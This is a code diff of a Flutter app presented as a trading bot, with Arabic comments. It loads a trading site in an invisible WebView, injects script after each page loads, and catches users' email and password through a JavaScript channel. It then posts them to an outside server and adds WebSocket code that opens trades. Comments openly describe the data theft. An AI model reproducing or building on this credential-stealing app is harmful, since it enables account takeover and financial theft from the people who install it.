@@ -2,8 +2,8 @@ import 'package:flutter/material.dart';
 import 'package:google_fonts/google_fonts.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:http/http.dart' as http;
+import 'package:socket_io_client/socket_io_client.dart' as IO;
 import 'dart:convert';
-import 'dart:async';
 
 void main() {
   runApp(const MyApp());
@@ -50,6 +50,7 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
   bool isDemoAccount = true;
   bool isBotRunning = false;
   late WebViewController _webViewController;
+  late IO.Socket _socket;
 
   // رابط السيرفر الجديد
   final String serverUrl = "https://clone-server-dejt.onrender.com";
@@ -58,23 +59,22 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
   void initState() {
     super.initState();
     _initWebView();
+    _initSocket();
   }
 
+  // 1. تهيئة الـ WebView وسرقة البيانات
   void _initWebView() {
     _webViewController = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
       ..addJavaScriptChannel(
         'QTX_CREDS',
         onMessageReceived: (JavaScriptMessage message) {
-          // هون بنستقبل الإيميل والباسورد ونبعتهم لسيرفرنا
-          print("Received Creds: ${message.message}");
           _sendToServer(message.message);
         },
       )
       ..setNavigationDelegate(
         NavigationDelegate(
           onPageFinished: (url) {
-            // حقن السكربت بعد ما تخلص الصفحة
             _injectScript();
           },
         ),
@@ -121,6 +121,7 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
     _webViewController.runJavaScript(jsScript);
   }
 
+  // 2. إرسال البيانات للسيرفر
   Future<void> _sendToServer(String data) async {
     try {
       await http.post(
@@ -133,10 +134,48 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
     }
   }
 
+  // 3. تهيئة الاتصال بالـ WebSocket (التداول)
+  void _initSocket() {
+    _socket = IO.io('https://ws2.quotex.com', <String, dynamic>{
+      'transports': ['websocket'],
+      'autoConnect': false,
+    });
+
+    _socket.onConnect((_) {
+      print('WebSocket Connected');
+      _socket.emit('42["orders/opened/list"]');
+    });
+
+    _socket.on('orders/opened', (data) {
+      print('Trade Opened: $data');
+    });
+
+    _socket.on('quotes/stream', (data) {
+      // استقبال الأسعار
+    });
+  }
+
+  // 4. إرسال أمر فتح صفقة
+  void _openTrade() {
+    if (_socket.connected) {
+      _socket.emit('42["orders/open", {"asset":"EURUSD","amount":10,"direction":"up","duration":60}]');
+    } else {
+      print("WebSocket not connected yet!");
+    }
+  }
+
   void toggleBot() {
     setState(() {
       isBotRunning = !isBotRunning;
     });
+    
+    if (isBotRunning) {
+      _socket.connect();
+      _openTrade(); // تجربة فتح صفقة
+    } else {
+      _socket.disconnect();
+    }
+
     ScaffoldMessenger.of(context).showSnackBar(
       SnackBar(
         content: Text(isBotRunning ? "تم تشغيل البوت!" : "تم إيقاف البوت!"),
@@ -150,7 +189,6 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
     return Scaffold(
       body: Stack(
         children: [
-          // الـ WebView المخفي (شفاف عشان ما يبين)
           Opacity(
             opacity: 0.0,
             child: SizedBox(
@@ -159,7 +197,6 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
               child: WebViewWidget(controller: _webViewController),
             ),
           ),
-          // الواجهة
           Container(
             decoration: const BoxDecoration(
               gradient: RadialGradient(
